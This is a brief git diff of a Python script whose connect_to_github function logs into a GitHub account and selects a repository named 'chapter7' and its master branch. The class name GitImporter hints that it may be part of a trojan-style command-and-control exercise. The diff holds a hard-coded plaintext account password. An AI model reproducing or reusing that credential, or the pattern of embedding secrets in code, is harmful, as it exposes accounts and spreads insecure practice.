@@ -54,13 +54,10 @@ class GitImporter(object):
 def connect_to_github():
 
 	# Login to GitHub
-	try:
-		gh = login(username="ginkodante@gmail.com",password="5Jy&r0$W1d*Ezs@&Kz")
-	except:
-		print("LOGIN FAILED")
+	gh = login(username="GinkoDante",password="5Jy&r0$W1d*Ezs@&Kz")
 		
 	# Get the correct repo
-	repo = gh.repository("ginkodante@gmail.com","chapter7")
+	repo = gh.repository("GinkoDante","chapter7")
 	# Get the correct branch
 	branch = repo.branch("master")
 	
